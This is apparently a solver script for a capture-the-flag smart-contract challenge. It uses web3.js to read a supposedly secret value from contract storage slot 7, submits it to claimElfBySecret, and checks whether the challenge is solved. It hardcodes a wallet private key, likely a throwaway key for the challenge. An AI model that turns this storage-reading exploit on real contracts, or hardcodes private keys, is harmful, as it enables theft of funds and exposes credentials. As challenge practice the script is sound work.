const Web3 = require('web3')

const privk = "0x6715d324d14e0565ab02a575fa5f74540719ba065a610cba6497cdbf22cd5cdb"
const addr = "0xCaffE305b3Cc9A39028393D3F338f2a70966Cb85"
const chall_addr = "0xe4e41E34fce9C9CcA20039678060ae55e92C830a"
const rpc = "http://dyn-01.xmas.root-me.org:16150/rpc"
const abi = require('./abi.json') // Compile contract's source code to get the ABI

const provider = new Web3.providers.http.HttpProvider(rpc);
const web3 = new Web3.Web3(provider);
web3.eth.accounts.wallet.add(privk)

const challenge = new web3.eth.Contract(abi, chall_addr)

async function main(){
  let secret =  await web3.eth.getStorageAt(chall_addr, 7);
  console.log("Secret extracted from storage:", secret)
  
  await challenge.methods.claimElfBySecret("malicious", secret).send({from: addr, gas: 300000})

  let solved = await challenge.methods.isSolved().call({ from: addr})
  console.log("Solved:", solved)
}

main()